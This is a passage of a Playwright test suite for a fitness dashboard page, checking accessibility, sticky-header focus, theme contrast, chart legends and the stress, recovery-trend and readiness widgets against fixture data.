  // Chart.js handles events on the next animation frame
  await page.evaluate(
    () => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))),
  );
  return canvas.evaluate((el) => {
    const c = window.Chart!.getChart(el as HTMLCanvasElement)!;
    return c.data.datasets.filter((_, n) => c.isDatasetVisible(n)).map((d) => String(d.label));
  });
}

/** The focused element: its aria-label, else its id, else its text. */
const focused = (page: Page) =>
  page.evaluate(() => {
    const el = document.activeElement as HTMLElement;
    return el.getAttribute("aria-label") ?? (el.id || el.textContent?.trim());
  });

/** The serious and critical WCAG 2.2 AA problems that axe finds on the page now. */
async function problems(page: Page): Promise<string[]> {
  if (!(await page.evaluate(() => "axe" in window)))
    await page.addScriptTag({ content: axe.source });
  return page.evaluate(async () => {
    const r = await (window as unknown as { axe: typeof axe }).axe.run(document, {
      runOnly: { type: "tag", values: ["wcag2a", "wcag2aa", "wcag21aa", "wcag22aa"] },
    });
    return r.violations
      .filter((v) => v.impact === "serious" || v.impact === "critical")
      .map((v) => `${v.id}: ${v.nodes.length}`);
  });
}

describe("sticky header", () => {
  const phone = { width: 390, height: 844 };
  const desktop = { width: 1280, height: 900 };

  it("sticky: keeps keyboard focus clear of the header on a phone", async () => {
    const { page } = await open(browser, pageFile(), { viewport: phone });
    const { hidden, stops } = await stopsUnder(page, ".top");
    expect(hidden).toEqual([]);
    expect(stops).toBeGreaterThan(15);
  });

  it("sticky: keeps keyboard focus clear of the edit bar on a desktop", async () => {
    const { page } = await open(browser, pageFile(), { viewport: desktop });
    await startEdit(page);
    const { hidden, stops } = await stopsUnder(page, ".page > .edit-bar");
    expect(hidden).toEqual([]);
    expect(stops).toBeGreaterThan(20);
  });

  it("sticky: keeps keyboard focus clear of the edit bar on a phone", async () => {
    const { page } = await open(browser, pageFile(), { viewport: phone });
    await startEdit(page);
    const { hidden, stops } = await stopsUnder(page, ".page > .edit-bar");
    expect(hidden).toEqual([]);
    expect(stops).toBeGreaterThan(20);
  });

  it("sticky: sets no offset where the header does not stick", async () => {
    const { page } = await open(browser, pageFile(), { viewport: desktop });
    await frames(page);
    expect(await stickyOffset(page)).toBe("0px");
  });

  it("sticky: follows the header height when the width changes", async () => {
    const { page } = await open(browser, pageFile(), { viewport: phone });
    await frames(page);
    const want = await page.evaluate(
      () => `${(document.querySelector(".top") as HTMLElement).offsetHeight + 8}px`,
    );
    expect(await stickyOffset(page)).toBe(want);
    await page.setViewportSize(desktop);
    await frames(page);
    expect(await stickyOffset(page)).toBe("0px");
    await page.setViewportSize(phone);
    await frames(page);
    expect(await stickyOffset(page)).toBe(want);
  });

  it("sticky: follows the header height after a language change", async () => {
    const file = pageFile({ settings: { languages: ["en", "it"] } });
    const { page } = await open(browser, file, { viewport: phone, locale: "it-IT" });
    await page.click(".account summary");
    await page.selectOption("#lang", "en");
    await frames(page);
    const height = await page.evaluate(
      () => (document.querySelector(".top") as HTMLElement).offsetHeight,
    );
    expect(await stickyOffset(page)).toBe(`${height + 8}px`);
  });

  it("sticky: watches only the bar of the last draw", async () => {
    const init = `
      window.watchedBars = new Set();
      const { observe, disconnect } = ResizeObserver.prototype;
      ResizeObserver.prototype.observe = function (target, ...rest) {
        if (target.matches?.(".top, .edit-bar")) window.watchedBars.add(this);
        return observe.call(this, target, ...rest);
      };
      ResizeObserver.prototype.disconnect = function () {
        window.watchedBars.delete(this);
        return disconnect.call(this);
      };`;
    const file = pageFile({ settings: { languages: ["en", "it"] } });
    const { page } = await open(browser, file, { viewport: phone, init });
    await page.click(".account summary");
    await page.selectOption("#lang", "it");
    await page.selectOption("#lang", "en");
    await frames(page);
    expect(await page.evaluate(() => (window as any).watchedBars.size)).toBe(1);
  });
});

describe("accessibility", () => {
  it("has no serious problem on the boards, in edit mode and in the light and both Munich themes", async () => {
    // with the opt-in workout trend, so every widget of the Run board is checked
    const { page } = await open(browser, pageFile({ settings: { workouts: true } }));
    for (const tab of ["all", "recovery", "running", "strengthTraining"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([tab, await problems(page)]).toEqual([tab, []]);
    }
    await page.click("[data-tab=all]");
    await startEdit(page);
    expect(["edit", await problems(page)]).toEqual(["edit", []]);
    await page.click(".edit-bar >> text=Done");
    await page.click(".account summary");
    await page.focus("#theme");
    await page.selectOption("#theme", "light");
    expect(["light", await problems(page)]).toEqual(["light", []]);
    await page.selectOption("#theme", "munich");
    expect(["munich", await problems(page)]).toEqual(["munich", []]);
    await page.selectOption("#theme", "munichDark");
    expect(["munichDark", await problems(page)]).toEqual(["munichDark", []]);
  });
});

describe("calendar contrast", () => {
  it("has a calendar focus ring and day borders with 3:1 contrast in every theme", async () => {
    const { page } = await open(browser, pageFile());
    const failures: string[] = [];
    // :focus-visible on a script focus needs keyboard modality
    await page.keyboard.press("Tab");
    for (const { id } of THEMES) {
      const out = await page.evaluate((theme) => {
        document.documentElement.dataset.theme = theme;
        // colours as the browser draws them: a 1 px canvas turns any CSS colour into RGB
        const ctx2d = document.createElement("canvas").getContext("2d")!;
        const ratio = (a: string, b: string) => {
          const [x, y] = [a, b]
            .map((css) => {
              ctx2d.fillStyle = css;
              ctx2d.fillRect(0, 0, 1, 1);
              return [...ctx2d.getImageData(0, 0, 1, 1).data]
                .slice(0, 3)
                .map((v) => {
                  const c = v / 255;
                  return c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
                })
                .reduce((sum, c, i) => sum + c * [0.2126, 0.7152, 0.0722][i], 0);
            })
            .toSorted((p, q) => q - p);
          return (x + 0.05) / (y + 0.05);
        };
        const cells = [...document.querySelectorAll<HTMLElement>("[data-id=calendar] .cal-cell")];
        const busy =
          cells.find((c) => c.classList.contains("l4")) ??
          cells.find((c) => c.classList.contains("l3"))!;
        const rest = cells.find((c) => c.classList.contains("l0") && c.dataset.date)!;
        const probe = document.createElement("div");
        probe.style.background = "var(--panel)";
        document.body.append(probe);
        const tile = getComputedStyle(probe).backgroundColor;
        probe.remove();
        busy.focus();
        const cs = getComputedStyle(busy);
        const edge = getComputedStyle(rest);
        const shadow = /(?:rgba?|color)\([^)]*\)/.exec(edge.boxShadow)?.[0];
        return {
          focusable: busy.matches(":focus-visible"),
          restVsTile: ratio(shadow ?? edge.backgroundColor, tile),
          // the ring borders the panel-coloured gap that the focus rule draws
          ringVsGap: ratio(cs.outlineColor, tile),
        };
      }, id);
      if (out.ringVsGap < 3) failures.push(`${id}: ring vs gap ${out.ringVsGap.toFixed(2)}`);
      if (!out.focusable) failures.push(`${id}: day not :focus-visible`);
      if (out.restVsTile < 3) failures.push(`${id}: rest day vs tile ${out.restVsTile.toFixed(2)}`);
    }
    expect(failures).toEqual([]);
  });
});

describe("phone", () => {
  const phone = { viewport: { width: 390, height: 844 } };

  it("folds the week window into one control", async () => {
    const { page } = await open(browser, pageFile(), phone);
    expect(await page.isVisible(".window-bar")).toBe(false);
    expect(await page.textContent(".window-toggle")).toBe("Weeks: All ▾");
    await page.click(".window-toggle");
    expect(await page.getAttribute(".window-toggle", "aria-expanded")).toBe("true");
    await page.click(".window-bar .chip >> text=Last 4");
    expect(await page.textContent(".window-toggle")).toBe("Weeks: Last 4 ▾");
  });

  it("keeps the header at the top, and fades the tabs that are out of view", async () => {
    const { page } = await open(browser, pageFile(), phone);
    expect(await page.getAttribute(".tabs", "class")).toContain("more");
    await page.evaluate(() => window.scrollTo(0, 2000));
    expect(await page.$eval(".top", (el) => el.getBoundingClientRect().top)).toBe(0);
    await page.$eval(".tabs", (el) => el.scrollTo({ left: el.scrollWidth }));
    await page.waitForFunction(() => !document.querySelector(".tabs")!.classList.contains("more"));
  });

  it("shows the whole week window on a desktop", async () => {
    const { page } = await open(browser, pageFile());
    expect(await page.isVisible(".window-bar")).toBe(true);
    expect(await page.isVisible(".window-toggle")).toBe(false);
  });
});

describe("focus", () => {
  it("stays on a window preset and on the theme menu after the page draws again", async () => {
    const { page } = await open(browser, pageFile());
    await page.focus(".window-bar .chip >> text=Last 8");
    await page.keyboard.press("Enter");
    expect(await focused(page)).toBe("Last 8");
    await page.click(".account summary");
    await page.focus("#theme");
    await page.selectOption("#theme", "light");
    expect(await focused(page)).toBe("theme");
  });

  it("stays on an edit tool, and says what changed", async () => {
    const { page } = await open(browser, pageFile());
    await startEdit(page);
    await page.focus("[aria-label='Move Weekly volume']");
    for (const key of ["Space", "ArrowRight", "Space"]) await page.keyboard.press(key);
    expect(await focused(page)).toBe("Move Weekly volume");
    expect(await page.textContent("#announce")).toBe("Weekly volume moved to position 6 of 12");
    // a hidden tile gives focus to the tile in its place
    await page.focus("[aria-label='Hide Weekly volume']");
    await page.keyboard.press("Enter");
    expect(await focused(page)).toBe("Hide Records");
    expect(await page.textContent("#announce")).toBe("Weekly volume hidden");
  });

  it("stays on an exercise chip of the Strength board", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const chip = ".ex-tools .chip >> nth=1";
    const name = await page.textContent(chip);
    await page.focus(chip);
    await page.keyboard.press("Enter");
    expect(await focused(page)).toBe(name);
  });

  it("closes the settings menu when focus leaves it", async () => {
    const { page } = await open(browser, pageFile());
    await page.click(".account summary");
    await page.focus("#theme");
    await page.keyboard.press("Tab");
    expect(await page.$(".account[open]")).toBeNull();
  });
});

describe("chart legends", () => {
  it("shows only the clicked series, and all of them on a second click", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#recovery" });
    // the legend of the HRV chart: band, nightly, 7-day average; the band's low edge is not in it
    expect(await clickLegend(page, "hrv", 1)).toEqual(["Range low", "Nightly HRV"]);
    expect(await clickLegend(page, "hrv", 1)).toEqual([
      "Range low",
      "Balanced range",
      "Nightly HRV",
      "7-day average",
    ]);
    expect(errors).toEqual([]);
  });

  it("hides just the clicked series with Shift", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#recovery" });
    expect(await clickLegend(page, "hrv", 1, "Shift")).toEqual([
      "Range low",
      "Balanced range",
      "7-day average",
    ]);
  });
});

const dayOf = (i: number) => new Date(Date.UTC(2026, 7, 1 + i)).toISOString().slice(0, 10);

describe("recovery history rows", () => {
  it("draws the last 14 days in the Resting HR, Sleep and Stress widgets of a page with 60 rows", async () => {
    // the rows before the last 14 are short, as the server writes them with recoveryHistory
    const recovery = Array.from({ length: 60 }, (_, i) =>
      i < 46
        ? { date: dayOf(i), sleepH: 7, sleepScore: 80, rhr: 50 }
        : { date: dayOf(i), sleepH: 7, deep: 1.5, sleepScore: 80, rhr: 50, stress: 35 },
    );
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, recovery } }),
      { hash: "#recovery" },
    );
    expect((await chartDataset(page, "restingHr", "Resting HR")).data).toHaveLength(14);
    expect((await chartDataset(page, "sleep", "Score")).data).toHaveLength(14);
    expect((await chartDataset(page, "stress", "Stress")).data).toEqual(Array(14).fill(35));
    expect(errors).toEqual([]);
  });
});

/** The first rows of the fixture, each with the given stress (undefined: the field is missing). */
const stressData = (...values: (number | undefined)[]) => ({
  ...data,
  v: DASHBOARD_VERSION,
  recovery: values.map((stress, i) => ({
    ...without(data.recovery[i], ["stress"]),
    ...(stress === undefined ? {} : { stress }),
  })),
});
const openStress = async (values: (number | undefined)[]) => {
  const { page, errors } = await open(browser, pageFile({ data: stressData(...values) }), {
    hash: "#recovery",
  });
  return { page, errors, stress: await chartDataset(page, "stress", "Stress") };
};

describe("stress widget", () => {
  it("draws the stress of the last 14 days, with gaps for missing and negative values", async () => {
    const { stress, errors } = await openStress([35, 0, undefined, -1]);
    expect(stress.data).toEqual([35, 0, null, null]);
    expect(stress.spanGaps).toBe(true);
    expect(errors).toEqual([]);
  });

  it("keeps a real value of 100, and draws only gaps when no day has a stress value", async () => {
    expect((await openStress([100])).stress.data).toEqual([100]);
    const none = await openStress([undefined, undefined]);
    expect(none.stress.data).toEqual([null, null]);
    expect(none.errors).toEqual([]);
  });

  it("scales the y axis from 0 to 100", async () => {
    const { page } = await openStress([35]);
    const scale = await page.evaluate(() => {
      const c = Object.values(window.Chart!.instances).find((x) =>
        x.canvas.closest("[data-widget=stress]"),
      )!;
      const y = (c.options.scales as Record<string, { min?: number; max?: number }>).y;
      return [y.min, y.max];
    });
    expect(scale).toEqual([0, 100]);
  });

  it("has no stress widget on a page without recovery data", async () => {
    const withStress = {
      rev: "r0",
      base: "preset",
      seen: MET,
      boards: {
        all: [
          { id: "coachNotes", widget: "coachNotes", span: 3 },
          { id: "stress", widget: "stress", span: 3 },
        ],
      },
    };
    const kept = await open(browser, pageFile({ layout: withStress }));
    expect(await tiles(kept.page)).toEqual(["coachNotes", "stress"]);
    const { page, errors } = await open(
      browser,
      pageFile({ layout: withStress, settings: { exclude: ["recovery"] } }),
    );
    expect(await tiles(page)).toEqual(["coachNotes"]);
    // the preset layout has no recovery board at all
    const presetPage = await open(browser, pageFile({ settings: { exclude: ["recovery"] } }));
    expect(await tiles(presetPage.page)).not.toContain("stress");
    expect(await presetPage.page.$("[data-tab=recovery]")).toBeNull();
    expect(errors).toEqual([]);
  });

  describe("on an edited Recovery board", () => {
    const edited = {
      rev: "r0",
      base: "preset",
      seen: {
        recovery: preset("recovery")
          .map((i) => i.widget)
          .filter((w) => w !== "stress"),
      },
      boards: { recovery: [{ id: "readiness", widget: "readiness", span: 2 }] },
    };

    it("adds the widget one time, and keeps it removed after a reload", async () => {
      const { page, errors } = await open(browser, pageFile({ layout: edited }), {
        hash: "#recovery",
      });
      expect(await tiles(page)).toEqual(["readiness", "stress"]);
      expect(await page.getAttribute("[data-id=stress]", "class")).toContain("span-3");
      await startEdit(page);
      await page.click("[aria-label='Hide Stress']");
      await page.click(".edit-bar >> text=Add widget");
      await page.click("dialog >> text=Remove Stress");
      await page.click("text=Done");
      expect(await tiles(page)).toEqual(["readiness"]);
      expect(JSON.parse((await saved(page)) ?? "null").layout.seen.recovery).toContain("stress");
      await page.reload();
      await page.waitForSelector(".page");
      expect(await tiles(page)).toEqual(["readiness"]);
      expect(errors).toEqual([]);
    });
  });

  it("ends the preset Recovery board with a tile of its own row, wider than the others", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#recovery" });
    const ids = await tiles(page);
    expect(ids.at(-1)).toBe("stress");
    const box = async (id: string) => (await page.locator(`[data-id=${id}]`).boundingBox())!;
    const [stress, battery] = [await box("stress"), await box("bodyBattery")];
    expect(stress.y).toBeGreaterThan(battery.y + battery.height - 1);
    expect(stress.width).toBeGreaterThan(battery.width * 2);
    expect(errors).toEqual([]);
  });
});

/** Recovery rows of the Recovery trend tests; the last 5 weeks start 09-28, 10-05, 10-12, 10-19, 10-26. */
const TREND_ROWS = [
  // the week of 10-05 has sleep 0 only: a gap in Sleep, not a 0
  { date: "2026-10-05", sleepH: 0, sleepScore: 75, rhr: 49 },
  { date: "2026-10-12", sleepH: 7, sleepScore: 80, rhr: 50 },
  { date: "2026-10-14", sleepH: 8, sleepScore: 90, rhr: 52 },
  // sleep and score, no resting HR; a 0 sleep does not pull the mean down
  { date: "2026-10-19", sleepH: 6.4, sleepScore: 70 },
  { date: "2026-10-20", sleepH: 0 },
  { date: "2026-10-26", sleepH: 7, sleepScore: 80, rhr: 48 },
  { date: "2026-10-28", sleepH: 7.5, sleepScore: 82, rhr: 50 },
];
const openTrend = async (
  recovery: object[] = TREND_ROWS,
  settings: object = { recoveryHistory: true },
  extra: object = {},
  options: object = {},
) => {
  const { page, errors } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, recovery, ...extra }, settings }),
    { hash: "#recovery", ...options },
  );
  const line = async (label: string) =>
    (await chartDataset(page, "recoveryTrend", label)) as {
      data: (number | null)[];
      spanGaps: unknown;
    };
  return { page, errors, line };
};

describe("recovery trend widget", () => {
  it("draws the weekly means of sleep, sleep score and resting HR on the Recovery board", async () => {
    const { page, errors, line } = await openTrend();
    expect(await tiles(page)).toContain("recoveryTrend");
    const sleep = await line("Sleep");
    expect(sleep.data.slice(-5)).toEqual([null, null, 7.5, 6.4, 7.3]);
    expect((await line("Sleep score")).data.slice(-5)).toEqual([null, 75, 85, 70, 81]);
    expect((await line("Resting HR")).data.slice(-5)).toEqual([null, 49, 51, null, 49]);
    // one point for each week of the window
    expect(sleep.data).toHaveLength(13);
    expect(errors).toEqual([]);
  });

  it("leaves a week without a row as a gap in every line, and spans the gaps", async () => {
    const { errors, line } = await openTrend();
    for (const label of ["Sleep", "Sleep score", "Resting HR"]) {
      const d = await line(label);
      expect(d.data[0], label).toBeNull();
      expect(d.spanGaps, label).toBe(true);
    }
    expect(errors).toEqual([]);
  });

  it("puts sleep on the left axis, and sleep score and resting HR on the right axis", async () => {
    const { page } = await openTrend();
    const axes = await page.evaluate(() => {
      const c = Object.values(window.Chart!.instances).find((x) =>
        x.canvas.closest("[data-widget=recoveryTrend]"),
      )!;
      return c.data.datasets.map((d) => [d.label, (d as { yAxisID?: string }).yAxisID]);
    });
    expect(axes).toEqual([
      ["Sleep", "y"],
      ["Sleep score", "y1"],
      ["Resting HR", "y1"],
    ]);
  });

  it("tells the lines apart, and colours a measure as the widget of that measure does", async () => {
    const { page, errors } = await openTrend();
    const colour = (widget: string, label: string) =>
      page.evaluate(
        ([w, l]) =>
          String(
            Object.values(window.Chart!.instances)
              .filter((c) => c.canvas.closest(`[data-widget=${w}]`))
              .flatMap((c) => c.data.datasets)
              .find((x) => x.label === l)!.borderColor,
          ),
        [widget, label],
      );
    const trend = [
      await colour("recoveryTrend", "Sleep"),
      await colour("recoveryTrend", "Sleep score"),
      await colour("recoveryTrend", "Resting HR"),
    ];
    expect(new Set(trend).size).toBe(3);
    expect(trend[2]).toBe(await colour("restingHr", "Resting HR"));
    expect(trend[1]).toBe(await colour("sleep", "Score"));
    expect(errors).toEqual([]);
  });

  it("follows the week window", async () => {
    const { page, errors, line } = await openTrend();
    await page.click(".window-bar .chip >> text=Last 4");
    expect((await line("Sleep")).data).toEqual([null, 7.5, 6.4, 7.3]);
    expect((await line("Resting HR")).data).toEqual([49, 51, null, 49]);
    expect(errors).toEqual([]);
  });

  it("says that it follows the week window", async () => {
    const { page } = await openTrend();
    expect(await page.textContent("[data-id=recoveryTrend]")).toContain(
      "Weekly averages: this widget follows the week window.",
    );
  });

  it("is not on the page without the setting, also when the rows are there", async () => {
    for (const settings of [{}, { recoveryHistory: false }]) {
      const { page, errors } = await openTrend(TREND_ROWS, settings);
      expect(await tiles(page)).not.toContain("recoveryTrend");
      expect(errors).toEqual([]);
    }
  });

  it("is not on a page that excludes recovery", async () => {
    const { page, errors } = await openTrend(TREND_ROWS, {
      recoveryHistory: true,
      exclude: ["recovery"],
    });
    expect(await tiles(page)).not.toContain("recoveryTrend");
    expect(errors).toEqual([]);
  });

  it("shows n/a and no chart when no row has a value", async () => {
    const { page, errors } = await openTrend([{ date: "2026-10-19" }, { date: "2026-10-20" }]);
    expect(await page.textContent("[data-id=recoveryTrend]")).toContain("n/a");
    expect(await page.$("[data-id=recoveryTrend] canvas")).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows n/a, no chart and no error for an empty recovery list", async () => {
    const { page, errors } = await openTrend([]);
    expect(await page.textContent("[data-id=recoveryTrend]")).toContain("n/a");
    expect(await page.$("[data-id=recoveryTrend] canvas")).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows n/a and no chart for rows that have only a date", async () => {
    const { page, errors } = await openTrend([{ date: "2026-10-05" }, { date: "2026-10-26" }]);
    expect(await page.textContent("[data-id=recoveryTrend]")).toContain("n/a");
    expect(await page.$("[data-id=recoveryTrend] canvas")).toBeNull();
    expect(errors).toEqual([]);
  });

  it("gives the last week a point from the days so far when the week is partial", async () => {
    const { errors, line } = await openTrend(
      [
        { date: "2026-10-26", sleepH: 7, sleepScore: 80, rhr: 48 },
        { date: "2026-10-28", sleepH: 8, sleepScore: 90, rhr: 50 },
      ],
      { recoveryHistory: true },
      { end: "2026-10-28" },
    );
    expect((await line("Sleep")).data.at(-1)).toBe(7.5);
    expect((await line("Sleep score")).data.at(-1)).toBe(85);
    expect((await line("Resting HR")).data.at(-1)).toBe(49);
    expect(errors).toEqual([]);
  });

  it("gives a point to the first week of the period, and null to each later week, for rows of that week only", async () => {
    const { errors, line } = await openTrend([
      { date: "2026-08-03", sleepH: 6, sleepScore: 70, rhr: 55 },
      { date: "2026-08-09", sleepH: 7, sleepScore: 80, rhr: 53 },
    ]);
    for (const [label, first] of [
      ["Sleep", 6.5],
      ["Sleep score", 75],
      ["Resting HR", 54],
    ] as const) {
      const d = (await line(label)).data;
      expect(d, label).toHaveLength(13);
      expect(d[0], label).toBe(first);
      expect(d.slice(1), label).toEqual(Array(12).fill(null));
    }
    expect(errors).toEqual([]);
  });

  it("draws one row in a window of one week without an error", async () => {
    const { page, errors, line } = await openTrend(
      [{ date: "2026-10-26", sleepH: 7, sleepScore: 80, rhr: 48 }],
      { recoveryHistory: true },
      { start: "2026-10-26", end: "2026-10-26" },
    );
    expect((await line("Sleep")).data).toEqual([7]);
    expect(await tiles(page)).toContain("recoveryTrend");
    expect(errors).toEqual([]);
  });

  it("has an Italian title", async () => {
    const { page, errors } = await openTrend(
      TREND_ROWS,
      { recoveryHistory: true, languages: ["en", "it"] },
      {},
      { locale: "it-IT" },
    );
    expect(await page.textContent("[data-id=recoveryTrend] h2")).toBe("Andamento recupero");
    expect(errors).toEqual([]);
  });
});

/** An indoor ride on a day; `extra` adds fields. */
const bikeRide = (start: string, extra: object = {}) => ({
  id: Number(start.replace(/\D/g, "")),
  name: "Indoor ride",
  type: "cycling",
  sport: "cycling",
  start: `${start} 07:00:00`,
  duration: "30:00",
  ...extra,
});
/** The dataset of `label` for the last 5 weeks, and the 4-week average line. */
async function lastWeeks(page: Page, widget: string, label: string) {
  const bars = (await chartDataset(page, widget, label)).data as (number | null)[];
  const avg = (await chartDataset(page, widget, "4-week average")).data as (number | null)[];
  return { bars: bars.slice(-5), avg: avg.slice(-5) };
}

// the last 5 weeks start on 09-28, 10-05, 10-12, 10-19 and 10-26 (the last one is in progress)
const loadSafety = async (rides: object[]) => {
  const { page, errors } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: rides } }),
  );
  const last5 = async (label: string) =>
    ((await chartDataset(page, "loadSafety", label)).data as (number | null)[]).slice(-5);
  const flagged = (await kpiTexts(page, "loadSafety"))["Weeks above +10%"][0];
  expect(errors).toEqual([]);
  return {
    bars: await last5("Weekly load"),
    ramp: await last5("Change vs week before (%)"),
    flagged,
  };
};

describe("overview widgets", () => {
  it("shows a tooltip on every chart", async () => {
    const { page, errors } = await open(browser, pageFile());
    expect(await page.evaluate(() => Object.keys(window.Chart!.instances).length)).toBeGreaterThan(
      3,
    );
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("leaves a session without a distance out of the average pace", async () => {
    const treadmill = {
      id: 9100,
      name: "Treadmill without a foot pod",
      type: "treadmill_running",
      sport: "running",
      start: "2026-10-25 07:00:00",
      duration: "1:00:00",
      avgHR: 140,
    };
    expect(await runningPace([treadmill, ...data.activities])).toBe(
      await runningPace(data.activities),
    );
  });

  it("totals the window", async () => {
    const { page } = await open(browser, pageFile());
    const km = data.activities.reduce((s: number, a: { km?: number }) => s + (a.km ?? 0), 0);
    expect(await page.textContent(".totals")).toContain(`${km.toFixed(1)} km`);
    expect(await page.textContent(".totals")).toContain("75 sessions");
  });

  it("gives a readiness verdict from its four inputs", async () => {
    const { page } = await open(browser, pageFile());
    expect(await page.textContent(".verdict")).toMatch(/^(Go easy|Ready to push|Normal)$/);
    expect(await page.$$eval("[data-id=readiness] .kpi", (k) => k.length)).toBe(4);
  });

  it("shows the readiness inputs and verdict that the digest gives on the same data", async () => {
    const r = digest({ ...data }).readiness!;
    const { page, errors } = await open(browser, pageFile());
    expect(await page.textContent(".verdict")).toBe(enTexts[`ready.${r.verdict!}`]);
    // every input has a value on the fixture
    expect(Object.values(r).every((v) => v !== null)).toBe(true);
    expect(await kpiTexts(page, "readiness")).toEqual(readinessTiles(r));
    expect(errors).toEqual([]);
  });

  it("shows n/a for the readiness inputs that the data does not have", async () => {
    const noRecovery = { ...data, v: DASHBOARD_VERSION, recovery: [] };
    let { page } = await open(browser, pageFile({ data: noRecovery }));
    let r = digest(noRecovery).readiness!;
    const lost = await kpiTexts(page, "readiness");
    expect(lost["Sleep score"]).toEqual(["n/a", null]);
    expect(lost["Resting HR"]).toEqual(["n/a", null]);
    expect(lost["HRV status"]).toEqual(["Balanced", null]);
    expect(lost).toEqual(readinessTiles(r));
    const noHrv = { ...data, v: DASHBOARD_VERSION, hrv: [] };
    ({ page } = await open(browser, pageFile({ data: noHrv })));
    r = digest(noHrv).readiness!;
    const noHrvTiles = await kpiTexts(page, "readiness");
    expect(noHrvTiles["HRV status"]).toEqual(["n/a", null]);
    expect(noHrvTiles["Sleep score"]).toEqual([String(r.sleepScore), null]);
    expect(noHrvTiles).toEqual(readinessTiles(r));
  });

  describe("readiness row dates", () => {
    const oldHrv = data.hrv.filter((r: { date: string }) => r.date <= "2026-10-24");
    const oldRecovery = data.recovery.filter((r: { date: string }) => r.date <= "2026-10-25");

    it("says the date of an HRV row that is not the last day of the data, readiness", async () => {
      const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, hrv: oldHrv } });
      const { page, errors } = await open(browser, file);
      const s = await readinessSubs(page);
      expect(s["HRV status"]).toEqual(["from Oct 24"]);
      expect(s["Sleep score"]).toEqual([]);
      expect(s["Resting HR"].some((x) => x.startsWith("from"))).toBe(false);
      expect(errors).toEqual([]);
    });

    it("says the date of a recovery row that is not the last day of the data, readiness", async () => {
      const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, recovery: oldRecovery } });
      const { page, errors } = await open(browser, file);
      const s = await readinessSubs(page);
      expect(s["Sleep score"]).toEqual(["from Oct 25"]);
      expect(s["Resting HR"]).toHaveLength(2);
      expect(s["Resting HR"][0]).toMatch(/^7 days before: /);
      expect(s["Resting HR"][1]).toBe("from Oct 25");
      expect(s["HRV status"]).toEqual([]);
      expect(errors).toEqual([]);
    });

    it("does not say a date for a readiness value that the last day lacks", async () => {
      const recovery = data.recovery.map((r: { date: string }) =>
        r.date === data.end ? { date: r.date } : r,
      );
      const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, recovery } });
      const { page, errors } = await open(browser, file);
      const t = await kpiTexts(page, "readiness");
      expect(t["Sleep score"]).toEqual(["n/a", null]);
      expect(t["Resting HR"][0]).toBe("n/a");
      const s = await readinessSubs(page);
      expect(s["Sleep score"]).toEqual([]);
      expect(s["Resting HR"].some((x) => x.startsWith("from"))).toBe(false);
      expect(errors).toEqual([]);
    });

    it("does not say a date for an HRV row without one, readiness", async () => {
      const hrv = data.hrv.map((r: { date: string }) =>
        r.date === data.end ? without(r, ["date"]) : r,
      );
      const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, hrv } });
      const { page, errors } = await open(browser, file);
      expect((await readinessSubs(page))["HRV status"]).toEqual([]);
      expect(await page.textContent("[data-id=readiness]")).not.toContain("undefined");
      expect(errors).toEqual([]);
    });

    it("does not say a date for a recovery row without one, readiness", async () => {
      const recovery = data.recovery.map((r: { date: string }) =>
        r.date === data.end ? without(r, ["date"]) : r,
      );
      const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, recovery } });
      const { page, errors } = await open(browser, file);
      const s = await readinessSubs(page);
      expect(s["Sleep score"]).toEqual([]);
      expect(s["Resting HR"].some((x) => x.startsWith("from"))).toBe(false);
      expect(await page.textContent("[data-id=readiness]")).not.toContain("undefined");
      expect(errors).toEqual([]);
    });

    it("does not say a date for an older row that has no values, readiness", async () => {
      const recovery = oldRecovery.map((r: { date: string }) =>
        r.date === "2026-10-25" ? { date: r.date } : r,
      );
      const hrv = oldHrv.map((r: { date: string }) =>
        r.date === "2026-10-24" ? { date: r.date } : r,
      );
      const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, recovery, hrv } });
      const { page, errors } = await open(browser, file);
      const s = await readinessSubs(page);
      expect(
        Object.values(s)
          .flat()
          .some((x) => x.startsWith("from")),
      ).toBe(false);
      expect((await kpiTexts(page, "readiness"))["HRV status"]).toEqual(["n/a", null]);
      expect(errors).toEqual([]);
    });

    it("does not say a date for HRV when there are no HRV rows, readiness", async () => {
      const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, hrv: [] } });
      const { page, errors } = await open(browser, file);
      expect((await kpiTexts(page, "readiness"))["HRV status"]).toEqual(["n/a", null]);
      expect((await readinessSubs(page))["HRV status"]).toEqual([]);
      expect(errors).toEqual([]);
    });

    it("says the date in Italian, readiness", async () => {
      const file = pageFile({
        data: { ...data, v: DASHBOARD_VERSION, hrv: oldHrv },
        settings: { languages: ["it"] },
      });
      const { page, errors } = await open(browser, file);
      const day = await page.evaluate(() =>
        new Intl.DateTimeFormat("it", { day: "numeric", month: "short", timeZone: "UTC" }).format(
          new Date("2026-10-24T00:00:00Z"),
        ),
      );
      expect((await readinessSubs(page))["Stato HRV"]).toEqual([`del ${day}`]);
      expect(errors).toEqual([]);
    });

    it("tells in the readiness note that it uses the newest data", async () => {
      const { page } = await open(browser, pageFile());
      const note = await page.textContent("[data-id=readiness]");
      expect(note).toContain("It uses the newest data");
      expect(note).not.toContain("It shows today");
    });

    it("says no date on a readiness widget whose rows are from the last day", async () => {
      const { page } = await open(browser, pageFile());
      const s = await readinessSubs(page);
      expect(
        Object.values(s)
          .flat()
          .some((x) => x.startsWith("from")),
      ).toBe(false);
    });
  });

  it("shows the load ratio as n/a when the data does not cover its 28 days", async () => {
    const full = await open(browser, pageFile());
    const values = await ratios(full.page);
    expect(values).toHaveLength(2);
